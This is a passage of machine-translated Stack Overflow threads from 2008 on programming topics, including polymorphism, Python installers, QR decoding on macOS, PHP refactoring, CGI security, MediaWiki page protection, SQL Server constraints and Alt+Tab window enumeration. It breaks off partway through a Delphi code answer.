[这实际上是一篇更好的文章](http://en.wikipedia.org/wiki/Polymorphism_in_object-oriented_programming)

多态性允许对象“看起来”相同，但行为方式不同。常见的例子是使用一个带有 Speak() 方法的动物基类，狗子类会发出 Bark，而 Pig 子类会发出 oink。

大多数人使用的 5 秒简短答案，以便其他开发人员可以了解多态性是重载和覆盖

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2008-10-17T04:30:52.410

相同的语法，不同的语义。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-16T23:53:00.913

最简单的描述方式：一个动词，可以应用于不止一种对象。

正如希勒尔所说，其他一切都只是评论。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-17T00:20:54.427

多态性通过依赖于一个共同的“父母”的知识来抽象地处理事物（想想像动物这样的层次结构作为狗和猫的父母）。

例如，所有动物都可以呼吸氧气，虽然它们的呼吸方式可能不同，但您可以设计一个为动物提供呼吸氧气的设施，同时支持狗和猫。

作为额外的一点，即使 Animal 是一个“抽象”标识符，您也可以这样做（没有真正的“Animal”事物，只是动物的类型）。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-10-17T01:15:27.877

多态性是将多于一种类型的值存储在单一类型的位置。

请注意，在我撰写本文时，这个问题的大多数其他答案实际上都是在描述动态调度，而不是多态性。

[动态调度](http://en.wikipedia.org/wiki/Dynamic_dispatch)需要多态性，但反之则不然。可以想象一种与 Java 或 C# 非常相似但其 System.Object 没有成员的语言；在对值进行任何操作之前，必须进行类型转换。在这种概念语言中，会有多态性，但不一定是虚拟方法或任何其他动态调度机制。

动态调度是相关但独特的概念，在大多数其他答案中都得到了很好的描述。但是，它通常在面向对象语言中的工作方式（根据第一个（“this”或“Self”）参数类型选择函数）并不是它可以工作的唯一方式。[多重分派](http://en.wikipedia.org/wiki/Multiple_dispatch)也是可能的，其中选择应用于所有参数的类型。

类似地，重载决议和多重分派是彼此完全相似的。重载决议是应用于静态类型的多重分派，而多重分派是应用于存储在多态位置中的运行时类型的重载决议。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-10-17T03:29:30.897

当相同的方法应用于多个类时，您会得到多态性。例如，字符串和列表都可能具有“反向”方法。两种方法具有相同的名称（“Reverse”）。两种方法都做了非常相似的事情（反转所有字符或反转列表中元素的顺序）。但是每个“反向”方法的实现都是不同的，并且特定于其类。（换句话说，String 像字符串一样反转自身，而 List 像列表一样反转自身。）

打个比方，你可以对法国厨师或日本厨师说“做晚餐”。每个人都会以自己独特的方式表演“做晚餐”。

实际结果是您可以创建一个“逆向引擎”，它接受一个对象并在其上调用“逆向”。只要对象具有 Reverse 方法，您的 Reversing Engine 就可以工作。

为了扩展厨师的类比，您可以构建一个“Waiterbot”，告诉厨师“制作晚餐”。Waiterbot 不必知道要制作什么类型的晚餐。它甚至不必确保它正在与厨师交谈。重要的是“厨师”（或消防员，或自动售货机，或宠物食品分配器）知道当被告知“做晚餐”时该做什么。

作为程序员，这给你带来的是更少的代码行以及类型安全或后期绑定。例如，这是一个类型安全和早期绑定的示例（使用我正在编写的类似 c 的语言）：

```
class BankAccount {
    void SubtractMonthlyFee
}

class CheckingAccount : BankAccount {}

class SavingsAccount : BankAccount {}

AssessFee(BankAccount acct) {
    // This will work for any class derived from
    //   BankAccount; even classes that don't exist yet
    acct.SubtractMonthlyFee
}

main() {

    CheckingAccount chkAcct;
    SavingsAccount saveAcct;

    // both lines will compile, because both accounts
    //   derive from "BankAccount". If you try to pass in
    //   an object that doesn't, it won't compile, EVEN
    //   if the object has a "SubtractMonthlyFee" method.
    AssessFee(chkAcct);
    AssessFee(saveAcct);
} 
```

这是一个没有类型安全但具有后期绑定的示例：

```
class DatabaseConnection {
    void ReleaseResources
}

class FileHandle {
    void ReleaseResources
}

FreeMemory(Object obj) {
    // This will work for any class that has a 
    //   "ReleaseResources" method (assuming all
    //   classes are ultimately derived from Object.
    obj.ReleaseResources
}

main() {

    DatabaseConnection dbConn;
    FileHandle fh;

    // You can pass in anything at all and it will
    //   compile just fine. But if you pass in an
    //   object that doesn't have a "ReleaseResources"
    //   method you'll get a run-time error.
    FreeMemory(dbConn);
    FreeMemory(fh);
    FreeMemory(acct); //FAIL! (but not until run-time)
} 
```

举一个很好的例子，看看 .NET ToString() 方法。所有类都有它，因为所有类都派生自 Object 类。但是每个类都可以以对自己有意义的方式实现 ToString()。

编辑：简单！=简短，恕我直言

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-10-22T23:07:02.547

多态性是根据公共属性将世界划分为多个盒子，当您只想使用这些公共属性时，将给定盒子中的项目视为可互换的。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-11-05T23:11:33.020

多态性是通过在它们之间建立共享身份然后利用它来将*不同*的事物视为*同一事物的能力。*

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2011-06-16T06:23:02.167

**多态性是一种语言功能，允许高级算法代码对多种类型的数据进行不变的操作。**

这是通过确保操作为每种数据类型调用正确的实现来完成的。即使在 OOP 上下文中（根据这个问题的标签），这个“正确的实现”也可以在编译时或运行时解决（如果您的语言同时支持）。在像 C++ 这样的一些语言中，编译器提供的对运行时多态性（即虚拟分派）的支持是面向对象编程的，而其他类型的多态性也可以对不是对象的数据类型（即不是`struct`或`class`实例，但可能是内置类型，如`int`or `double`)。

（我的回答中列出并对比了 C++ 支持的多态类型：C++ 中的[多态](https://stackoverflow.com/questions/5854581/polymorphism-in-c/5854862#5854862)- 即使您编写其他语言，它也可能具有指导意义）

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2008-10-16T22:04:33.050

我尝试和思考的方式看起来相同，但根据实例可能具有不同的功能。所以你可以有一个类型

```
interface IJobLoader 
```

但取决于它的使用方式，它可能具有不同的功能，但看起来仍然相同。您可能有 BatchJobLoader、NightlyJobLoader 等实例

也许我已经走远了。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2008-10-17T01:38:34.927

术语多态性也适用于重载函数。例如，

```
string MyFunc(ClassA anA);
string MyFunc(ClassB aB); 
```

是多态的一个非面向对象的例子。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2008-10-17T01:44:18.863

这是一种处理不同事物的方法，这些事物可以以相同的方式做类似的事情，而无需关心它们是如何做的。

假设您有一个游戏，其中有一堆不同类型的车辆在四处行驶，例如汽车、卡车、滑板、飞机等……它们都可以停止，但每辆车的停止方式不同。有些车辆可能需要降档，有些车辆可能会冷停。多态性让您可以做到这一点

```
foreach (Vehicle v in Game.Vehicles)
{
   v.Stop();
} 
```

停止的实现方式推迟到不同的车辆，因此您的程序不必关心它。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2008-10-17T02:01:49.153

是对象必须以不同方式响应同一消息的能力。

例如，在 smalltalk、Ruby、Objective-C 等语言中，您只需发送消息，它们就会响应。

```
 dao  = XmlDao.createNewInstance()    #obj 1
 dao.save( data )

 dao = RdbDao.createNewnewInstance()  #obj 2
 dao.save( data ) 
```

在此示例中，两个不同的对象以不同的方式响应相同的消息：“createNewInstance() 和 save(obj)”

他们以不同的方式行动，传达相同的信息。在上述语言中，类甚至可能不在同一个类层次结构中，它们响应消息就足够了。

在 Java、C++、C# 等语言中，为了将对象分配给对象引用，它们必须通过实现接口或作为公共类的子类来共享相同的类型层次结构。

容易..简单。

到目前为止，多态是面向对象编程中最重要和最相关的特性。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2008-10-17T03:48:29.127

调用新代码只是一种让老冷的方法。您编写了一些应用程序，该应用程序接受一些“Shape”接口以及其他人必须实现的方法（例如 - getArea）。如果有人想出一种新的绝妙方法来实现该接口，您的旧代码可以通过 getArea 方法调用该新代码。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2008-10-22T23:14:49.177

某种类型的对象（例如汽车）像另一种类型（例如车辆）一样行动（例如制动）的能力，这通常表明在类型层次结构中的某个点有共同的祖先（例如汽车是车辆的子类型） .

* * *

## 回答 #24

> 赞同：-3
> 
> 时间：2008-10-17T04:21:43.257

多态性是面向对象的解决方案，用于解决将函数传递给另一个函数的问题。在C中你可以做

```
 void h() { float x=3.0; printf("%f", x); }
 void k() { int y=5; printf("%i", y); }
 void g(void (*f)()) { f(); }
 g(h);  // output 3.0
 g(k);  // output 5 
```

在 C 中，如果函数依赖于附加参数，事情就会变得复杂。如果函数 h 和 k 依赖于不同类型的参数，你就有麻烦了，你必须使用强制转换。您必须将这些参数存储在数据结构中，并将指向该数据结构的指针传递给 g，然后将其传递给 h 或 k。h 和 k 将指针转换为指向正确结构的指针并解压缩数据。由于可能的转换错误，非常混乱且非常不安全：

```
 void h(void *a) { float* x=(float*)a; printf("%f",*x); }
 void k(void *a) { int* y=(int*)a; printf("%i",*y); }
 void g(void (*f)(void *a),void *a) { f(a); }
 float x=3.0;
 int y=5;
 g(h,&x); // output x
 g(k,&y); // output y 
```

所以他们发明了多态性。h 和 k 被提升为类，实际函数被提升为方法，参数是各自类的成员变量，h 或 k。您无需传递函数，而是传递包含所需函数的类的实例。实例包含它自己的参数。

```
class Base { virtual public void call()=0; }
class H : public Base { float x; public void call() { printf("%f",x);} } h;
class K : public Base { int y; public void call() { printf("%i",y);} } k;
void g(Base &f) { f.call(); };
h.x=3.0;
k.y=5;
g(h); // output h.x
g(k); // output k.x 
```

# python - 向非技术用户分发基于 Python 的独立应用程序

> ID：210461
> 
> 赞同：5
> 
> 时间：2008-10-16T22:00:41.043
> 
> 标签：python, installation

我正在用 Python 编写一个 Web 应用程序，供教师和学生在课堂上使用。它将从一个托管网站运行，但我也希望人们能够下载一个独立的应用程序，如果他们想要更高的性能，或者他们根本无法在课堂上使用 Internet 连接，他们可以在本地安装。

用户将无法管理诸如“首先安装 Python，然后安装依赖项，下载 .tar.gz 存档并在命令行中键入这些命令......”之类的指令。我需要能够创建一个一体式安装程序，该安装程序可以潜在地安装 Python、依赖项 (Python-LDAP)、一些 Python 代码，并将基于 Python 的 Web 服务器注册为 Windows 服务。

我已经查看了以前的问题，但似乎没有一个完全相关。我不关心源代码的安全性（我的应用程序将是开源的，我会出售与之配套的内容），我只需要非技术 Windows 用户能够毫不费力地下载和使用我的应用程序.

我目前的想法是使用[NSIS](http://nsis.sourceforge.net/Main_Page)创建一个包含 Python 和 Python-LDAP 作为 MSI 的安装程序，然后将我自己的简单的基于 Python 的 Web 服务器注册为 Windows 服务，并在开始菜单/桌面上链接到[http ：//本地主机](http://localhost)。这对 NSIS 是否可行 - 例如，NSIS 可以检查当前安装的 Python 副本吗？有没有更好的方法来做到这一点 - 是否有一个方便的框架可以让我把我的代码放在一个文件夹中并将它捆绑起来制作一个安装程序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T22:23:47.783

使用 NSIS 很棒（我也使用它），但我建议在使用 NSIS 之前使用像 pyinstaller （我个人的最爱，替代品 bb_freeze，py2exe）这样的“打包程序”来创建一个 exe

这样做的主要好处是；您的下载量较小，因为您没有捆绑整个 Python 标准库和应用程序不需要的额外内容，并且您会获得一个 exe 文件来启动！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-20T22:42:13.427

您可以在多合一安装程序中尝试包含 Apache、MySQL、Python 等的[Django 的 Bitnami 堆栈。](http://bitnami.org/stack/djangostack)它是免费/开源的

# javascript - 对抗 Visual Studio 2008 中的可疑 JavaScript IntelliSense 支持

> ID：210467
> 
> 赞同：7
> 
> 时间：2008-10-16T22:03:35.390
> 
> 标签：javascript, visual-studio-2008, intellisense

随着 Visual Studio 2008 的发布，Microsoft 实现了对 JavaScript 的代码完成和 IntelliSense 支持。

不幸的是，对 JavaScript 的支持充其量是阴暗的——主要的麻烦之一是在引用外部 JavaScript 文件时，开发人员必须打开和关闭 JavaScript 文件以强制 Visual Studio 更新它的定义。

有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-16T22:05:51.190

就在这里：

> 菜单：“编辑”->“智能感知”->“更新 JScript 智能感知”

和键盘快捷键：

> Ctrl + Shift + J

如果你想知道; 是的，我已经回答了我的问题（五分钟前想通了）。我只是想与我的 JavaScript 开发人员分享我的新知识 :)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-11-13T00:44:53.110

Visual Studio 2008 应该检测参考更改。但是，过时检查和更新启动是在定期维护事件中完成的。更改后需要几秒钟的时间才会在状态栏中显示“正在更新 Intellisense...”消息。

正如 roosteronacid 所说，Ctrl-Shift-J 将强制立即更新（即使没有任何变化也会更新）。不过，这只影响外部引用的文件。您正在编辑的文件中的 IntelliSense 应该始终是最新的。

# macos - QR解码器适用于mac？

> ID：210470
> 
> 赞同：19
> 
> 时间：2008-10-16T22:04:18.853
> 
> 标签：macos, qr-code, decoder

任何人都知道可以在 mac 上运行或可能在线的 QR 解码器？我只需要解码一个图像。

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2017-11-02T22:49:02.093

使用brew，很容易安装zbar，一个二维码阅读器。

```
brew install zbar 
```

然后可以通过调用读取二维码：

```
zbarimg qrcode_file.png 
```

同样@jm666，[brew 可用于安装 opencv](https://stackoverflow.com/q/46066903/8524178)。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-03-03T10:40:07.123

不幸的是，最常用的库[libdecodeqr](http://trac.koka-in.org/libdecodeqr)依赖于 OpenCV (gtk2)，在 OS X 上编译它太难了。（试图编译它，因为`Image::DecodeQR`perl 模块需要它 - 但不成功）。

幸运的是，从下面的引用中找到了这个链接：[http](http://macscripter.net/viewtopic.php?id=37404) ://macscripter.net/viewtopic.php?id= 37404：

1.  下载[ZBar 源代码](http://zbar.sourceforge.net/download.html)。
2.  解压缩 tarball，然后在终端窗口中打开生成的目录。
3.  键入`./configure --disable-video --without-python --without-gtk --without-qt`以配置构建过程，将依赖项限制为 ImageMagick。
4.  键入“make”以调用构建过程。
5.  键入“sudo make install”，并在出现提示时输入管理员密码。

您将需要`ImageMagick`可以从[macports](http://www.macports.org)安装的内容。

安装 ZBar 后，你可以用命令很好地解码 qrcode

```
zbarimg qrcode_file.png 
```

在 OS X Mavericks 10.9.2（和 Lion/10.7.5）上进行了测试，并且运行良好。因为它只依赖于 ImageMagick（存在于 macports 中）——在其他 OS X 版本上也应该很容易“编译”。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2021-10-08T11:53:53.393

[有一个名为 ZBar](https://github.com/mchehab/zbar)的开源命令行工具。它将照片作为参数，并从它在图像中检测到的任何二维码中提取信息。

开源项目[QR-Reader-Mac](https://github.com/FrederikRogalski/QR-Reader-Mac)提供了一个 Applescript 脚本，作为`zbar`. 您可以创建脚本的快捷方式来处理 QRCode 或创建服务，如下所述。该脚本将在您的默认浏览器中自动打开 QRCode 中包含的 URL。

## 用法

![qrreader](https://user-images.githubusercontent.com/31591562/136548790-18e1fc06-16ef-44a1-9510-6ffa505b9da5.gif)

## 一步步

ZBar 可以通过 Homebrew 轻松安装：

```
brew install zbar 
```

要安装 QR-Reader-Mac：

1.  打开[QR-Reader-Mac GitHub 项目页面](https://github.com/FrederikRogalski/QR-Reader-Mac)，选择`Code`，然后将项目下载为 ZIP 文件：

    [![在此处输入图像描述](https://i.stack.imgur.com/xRylI.png)](https://i.stack.imgur.com/xRylI.png)

2.  双击 ZIP 文件将其解压缩。

3.  双击您要安装的工作流程。应出现以下弹出窗口：

4.  按 确认`install`。

5.  打开 System Preferences 并在 Keyboard > Shortcuts > Services > General 下添加 open_QRCode 服务的快捷方式： ![图片](https://user-images.githubusercontent.com/31591562/136544132-bf1d2889-87b1-4971-b30e-04d441ade14c.png)

（**重要提示**：请注意，QR-Reader-Mac 期望在 中找到可执行文件“zbarimg” `/usr/local/bin/zbarimg`，这是 Homebrew 安装它的标准路径。）

## 复制到剪贴板

可`QRCode2Clipboard.workflow`用于将 QR 码的内容提取到剪贴板中。它可以按照与`open_QRCode.workflow`.

# php - 删除 PHP 中重复的、硬编码的循环和条件

> ID：210475
> 
> 赞同：2
> 
> 时间：2008-10-16T22:05:37.837
> 
> 标签：php, spl

我看到这个关于 C# 的问题我想要一个 PHP 的答案。我有一些旧代码有 4 页的 foreach 循环和条件，这使得它难以阅读和遵循。我怎样才能使这个更面向对象？我正在考虑使用 SPL 函数，但还不完全了解其中涉及的内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-16T22:48:48.903

这段代码可能会被显着清理，并在不涉及 SPL 的情况下向 OO 方向推得更远。

仅当您想在 foreach() 等语言结构、count() 等内置函数或数组访问函数（运算符 [] 和 key()、next() 等函数）中更改正常对象行为时，才需要 SPL .

清理建议：

*   如果在代码中多次（超过 1 或 2 次）执行相同的操作，请将其分解为一个函数。如果要对数组中的所有元素执行此操作，请考虑使用[array_walk](http://php.net/array_walk)。如果由于某种原因不适合遍历数组，请使用循环:)

*   如果您有多个语义连接数据的实例，这些数据比键：值对更复杂，并且具有关联的操作，请考虑将其包装在一个类中。但是一个正式记录的协会。数组可能也适合您。取决于您的风格和数据类型。这里重要的是处理数据的方法的结构和文档。你是否把它作为一个班级并不重要。

*   完成上述步骤后，将新编写的函数和对象分解为单独的包含文件。我倾向于把大部分东西都包在一个班级里，所以我主要有一个班级公关。文件。但是一些帮助类与主类共享一个文件，等等。你会感觉到它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-17T10:18:48.903

如果我是你，我会从编写测试代码开始。

如果您可以构建一组完全描述您正在重构的功能的测试用例，您可以继续并安全地重写您的代码，因为它仍然可以工作。

[PHPUnit](http://phpunit.sourceforge.net)可能是一个很好的起点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T22:21:42.750

慢慢开始。一次重构它。

如果您要循环大量数组，请查看数组函数，如[`array_map`](http://php.net/array_map)、[`array_walk`](http://php.net/manual/en/function.array-walk.php)和朋友。这更像是一种功能重构，而不是 OO 重构，但它会带你走得很远。 **如果**进行更多的 OO 是有意义的，那么您将拥有一些功能，然后您可以根据需要将它们推送到适当的类中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-17T04:37:46.687

来自 Johnathan 和 gnud 的一些好建议。不必太担心 SPL，[了解更多关于重构](https://stackoverflow.com/questions/161975/refactoring-code-when-to-do-what)的信息，并了解哪些[重构工具可用于 PHP](https://stackoverflow.com/questions/19758/tools-for-php-code-refactoring)。

另外，我不能推荐足够的阅读[《有效地使用旧代码》](https://rads.stackoverflow.com/amzn/click/com/0131177052)：

[![替代文字](https://i.stack.imgur.com/VZfwy.jpg)](https://i.stack.imgur.com/VZfwy.jpg)

当然还有规范的[重构书](https://rads.stackoverflow.com/amzn/click/com/0201485672)：

[替代文字 http://ecx.images-amazon.com/images/I/519XT0DER6L._SL500_BO2,204,203,200_AA219_PIsitb-sticker-dp-arrow,TopRight,-24,-23_SH20_OU01_.jpg](http://ecx.images-amazon.com/images/I/519XT0DER6L._SL500_BO2,204,203,200_AA219_PIsitb-sticker-dp-arrow,TopRight,-24,-23_SH20_OU01_.jpg)

PHP 是一门难以清除代码异味的语言，但只要有一点毅力，就可以做到！你会感谢自己每天必须查看你的代码库。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T10:41:00.323

如果我对您的理解正确，您的 foreach 循环（等等）嵌套了 4 页深，您想知道您听说过的这个 OO 事情是否可以提供帮助。

您当然应该继续重构您的代码以减少嵌套级别并提高可读性，但不要将其与面向对象混淆。

OO 是一种结构化代码的方法，将数据结构的定义放在操作这些数据结构的代码旁边。虽然它的主要目标之一是通过提供复杂性的封装来提高可读性，但 OO 并不是实现这一目标的唯一方法。

如果您还不了解 OO 的概念，您可能会发现重构代码以将内部循环内的代码分离为单独的函数更容易，这些函数（希望）每个函数都有一个单一的简单任务。

不要误会我的意思；我是 OO 的倡导者，尤其是作为一种为开发人员提供更高层次的概念以更有效地讨论设计的技术。OO 非常值得学习。

但是，不要因为缺乏 OO 知识而阻止您将内部代码拉出循环并将它们放入单一用途的函数中。

（如果我误解了您的 OO 知识水平，我深表歉意。）

# security - 基于 CGI 的 Web 应用程序的安全性如何？

> ID：210490
> 
> 赞同：3
> 
> 时间：2008-10-16T22:11:46.013
> 
> 标签：security, cgi

使用 CGI 的一个众所周知的主要缺点是网络服务器性能差。但是基于 CGI（主要是 C/C++）的应用程序有多安全？基于 C/C++ 构建的 CGI 架构中是否存在任何重大安全漏洞？

我想知道一些基于 CGI 的网络应用程序/网站的现实生活实现。我知道的一个是 javaranch.com。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-17T04:58:46.880

我在任何地方都会看到的主要安全漏洞，包括 C/C++，不会使用标准的、开放的 CGI 库，没有阅读它的文档，并且认为你无论如何都是安全的。

*   不要重新发明轮子。使用 CGI 库。有些语言有这个内置的（PHP 可能有），有些包含它（想到 Perl），有些需要你从其他地方获取它（C/C++）。确保你知道它是什么，并且你使用它。不要试图自己实现它**。**如果你要问安全，你和我一样，没有资格写。
*   阅读文档。如果您使用的是完善的库，则会有关于安全问题的文档以及您可以采取哪些措施来避免这些问题。
*   永远不要假设你是安全的。我很确定我不安全，即使我已经遵循 Perl 的 CGI 库中的所有规则，以及数据库接口库中的规则等。但我仍然认为我不安全，并保持在那里做任何事情时，它都在我的脑海中。如果我成为安全专家，也许我会改变我的假设。还不确定。

安全总是多方面的，而且总是不完整的。各种软件中一直存在漏洞——以前可能被认为是安全的软件。现在我们拥有比 15 年前更多的最佳安全实践。我们有 SELinux 以提高安全性。

当然，问题是——你的应用程序有足够的安全性吗？合理的努力是否能让您获得合理的安全级别？当然，这就是我不使用 C/C++ 的原因，而是使用 Perl。确保我不会在 Perl 中覆盖内存比在 C++ 中要少得多。这是一个安全级别，不涉及实际工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T22:13:16.090

CGI 并不比任何其他 WSAPI 更不安全。这完全取决于程序对代码的作用。CGI 所做的只是设置环境变量并处理程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-26T23:42:22.467

许多网站都是基于 CGI 的。许多位于主机上的 PHP 站点都在 CGI 模式下运行 - mod_php 很难在共享环境中使用 - 没有 suid。

一般来说，作为 CGI 运行的性能较低，但安全性更好——您无法访问网络服务器内部（如 mod_perl 和 mod_php），因此使用漏洞更难。如果您使用 cgi-bin，您的非执行文件是不可见的（PHP 程序员的一个常见错误是他们有扩展名为 .inc 的库，因此当直接请求此文件时会显示源代码）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-06-03T16:19:14.077

Perl's taint-checking mode provides a marvelous way to increase security.

# mediawiki - MediaWiki 中的受保护页面

> ID：210495
> 
> 赞同：5
> 
> 时间：2008-10-16T22:14:59.987
> 
> 标签：mediawiki, wiki

我目前使用 MediaWiki 作为文档网站，并通过 LDAP 验证登录。

然而，我们遇到了一个障碍。某些页面包含敏感信息。例如，显示“单击此处登录”的链接。我希望能够保护某些页面不被任何人编辑。我想允许某些用户组（如员工）编辑这些页面。

如何在 MediaWiki 中按组设置页面保护（如果可能）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-16T22:18:04.520

这在[MediaWiki 文档](http://en.wikibooks.org/wiki/MediaWiki_Administrator%27s_Handbook/Page_Protection)中有详细介绍：

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T22:30:05.417

此外，链接到您的页面保护选项[Andy Lester还可以设置站点范围的保护，防止帐户创建和异常编辑。](https://stackoverflow.com/users/8454/andy-lester)参见[MediaWiki 手册：阻止访问](http://www.mediawiki.org/wiki/Manual:Preventing_access)

# sql-server - SQL Server 2005，需要脚本来检查表上的所有约束

> ID：210496
> 
> 赞同：1
> 
> 时间：2008-10-16T22:17:07.487
> 
> 标签：sql-server, rename

我继续收到此错误：

```
Object '%s' cannot be renamed because the object participates in enforced dependencies 
```

我需要找到一个脚本来帮助我找到该表的所有依赖项。我需要删除它们，重命名，然后将它们带回来。

SQL 服务器 2005

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-16T22:24:06.037

禁用所有约束

```
sp_msforeachtable "ALTER TABLE ? NOCHECK CONSTRAINT all"
go
sp_msforeachtable "ALTER TABLE ? DISABLE TRIGGER  all"
go 
```

重新启用

```
sp_msforeachtable"ALTER TABLE ? CHECK CONSTRAINT all"
go
sp_msforeachtable "ALTER TABLE ? ENABLE TRIGGER  all"
go 
```

您应该能够轻松地将其调整为仅一张表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-16T23:29:49.570

[这篇文章](https://stackoverflow.com/questions/181909/tool-for-scripting-table-data#181942)包含我最初为 SQL Server 2000 编写并移植到 2005 的 db 逆向工程脚本。如果您查看执行外键关系的位，您可以了解如何从数据字典中获取依赖项。

# c# - 像 alt-tab 一样枚举窗口

> ID：210504
> 
> 赞同：32
> 
> 时间：2008-10-16T22:21:42.750
> 
> 标签：c#, windows, winapi

我正在为 Vista 创建一个 alt-tab 替代品，但在列出所有活动程序时遇到了一些问题。

我正在使用 EnumWindows 来获取 Windows 列表，但这个列表很大。当我只打开 10 个窗口时，它包含大约 400 个项目。它似乎是每个控件和许多其他东西的 hwnd。

所以我必须以某种方式过滤这个列表，但我不能像 alt-tab 那样做到这一点。

这是我现在用来过滤列表的代码。它工作得很好，但我得到了一些不需要的窗口，比如 Visual Studio 中分离的工具窗口，我也想念 iTunes 和 Warcraft3 等窗口。

```
private bool ShouldWindowBeDisplayed(IntPtr window)
{
    uint windowStyles = Win32.GetWindowLong(window, GWL.GWL_STYLE);

    if (((uint)WindowStyles.WS_VISIBLE & windowStyles) != (uint)WindowStyles.WS_VISIBLE ||
        ((uint)WindowExStyles.WS_EX_APPWINDOW & windowStyles) != (uint)WindowExStyles.WS_EX_APPWINDOW)
    {
        return true;
    }
    return false;
} 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-10-16T22:26:51.600

Raymond Chen 不久前回答了这个问题
（[https://devblogs.microsoft.com/oldnewthing/20071008-00/?p=24863](https://devblogs.microsoft.com/oldnewthing/20071008-00/?p=24863)）：

> 它实际上非常简单，尽管您几乎无法自己猜到任何东西。注意：该算法的细节是一个实现细节。它可以随时改变，所以不要依赖它。事实上，它已经随着 Flip 和 Flip3D 发生了变化；我只是在这里谈论经典的 Alt+Tab 窗口。
> 
> 对于每个可见窗口，沿着其所有者链向上走，直到找到根所有者。然后沿着可见的最后一个活动弹出链往回走，直到找到一个可见的窗口。如果您回到开始的位置，则将窗口放在 Alt+Tab 列表中。在伪代码中：

```
BOOL IsAltTabWindow(HWND hwnd)
{
 // Start at the root owner
 HWND hwndWalk = GetAncestor(hwnd, GA_ROOTOWNER);

 // See if we are the last active visible popup
 HWND hwndTry;
 while ((hwndTry = GetLastActivePopup(hwndWalk)) != hwndTry) {
  if (IsWindowVisible(hwndTry)) break;
  hwndWalk = hwndTry;
 }
 return hwndWalk == hwnd;
} 
```

请点击 Chen 的博客条目的链接了解更多详情和一些角落条件。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-10-17T23:52:43.300

感谢 Mike B。Raymonds 博客中的示例为我指明了正确的方向。

然而，有一些例外情况，Windows Live messenger 有很多技巧可以在 Windows 等下创建阴影：@

这是我的完整代码，已经使用了一天，并没有注意到与真正的 alt 选项卡有任何区别。有一些底层代码没有发布，但弄清楚它的作用是没有问题的。:)

```
 private static bool KeepWindowHandleInAltTabList(IntPtr window)
    {
        if (window == Win32.GetShellWindow())   //Desktop
            return false;

        //http://stackoverflow.com/questions/210504/enumerate-windows-like-alt-tab-does
        //http://blogs.msdn.com/oldnewthing/archive/2007/10/08/5351207.aspx
        //1\. For each visible window, walk up its owner chain until you find the root owner. 
        //2\. Then walk back down the visible last active popup chain until you find a visible window.
        //3\. If you're back to where you're started, (look for exceptions) then put the window in the Alt+Tab list.
        IntPtr root = Win32.GetAncestor(window, Win32.GaFlags.GA_ROOTOWNER);

        if (GetLastVisibleActivePopUpOfWindow(root) == window)
        {
            WindowInformation wi = new WindowInformation(window);

            if (wi.className == "Shell_TrayWnd" ||                          //Windows taskbar
                wi.className == "DV2ControlHost" ||                         //Windows startmenu, if open
                (wi.className == "Button" && wi.windowText == "Start") ||   //Windows startmenu-button.
                wi.className == "MsgrIMEWindowClass" ||                     //Live messenger's notifybox i think
                wi.className == "SysShadow" ||                              //Live messenger's shadow-hack
                wi.className.StartsWith("WMP9MediaBarFlyout"))              //WMP's "now playing" taskbar-toolbar
                return false;

            return true;
        }
        return false;
    }

    private static IntPtr GetLastVisibleActivePopUpOfWindow(IntPtr window)
    {
        IntPtr lastPopUp = Win32.GetLastActivePopup(window);
        if (Win32.IsWindowVisible(lastPopUp))
            return lastPopUp;
        else if (lastPopUp == window)
            return IntPtr.Zero;
        else
            return GetLastVisibleActivePopUpOfWindow(lastPopUp);
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-14T23:09:43.333

这是 pascal/delphi 中的一个函数，您可以轻松地将其转换为 C#。

它包括对 Windows 10 应用程序的支持。

```
 EnumWindows(@ListApps, 0);

function ListApps(LHWindow: HWND; lParam: Pointer): Boolean; stdcall;
var
   LHDesktop: HWND;
   LHParent: HWND;
   LExStyle: DWORD;

   AppClassName: array[0..255] of char;

   Cloaked: Cardinal;

   titlelen: Integer;
   title: String;
begin

  LHDesktop:=GetDesktopWindow;

    GetClassName(LHWindow, AppClassName, 255);
    LHParent:=GetWindowLong(LHWindow,GWL_HWNDPARENT);
    LExStyle:=GetWindowLong(LHWindow,GWL_EXSTYLE);

    if AppClassName = 'ApplicationFrameWindow' then
      DwmGetWindowAttribute(LHWindow, DWMWA_CLOAKED, @cloaked, sizeof(Cardinal))
    else
      cloaked := DWM_NORMAL_APP_NOT_CLOAKED;

    if IsWindowVisible(LHWindow)
    and (AppClassName <> 'Windows.UI.Core.CoreWindow')
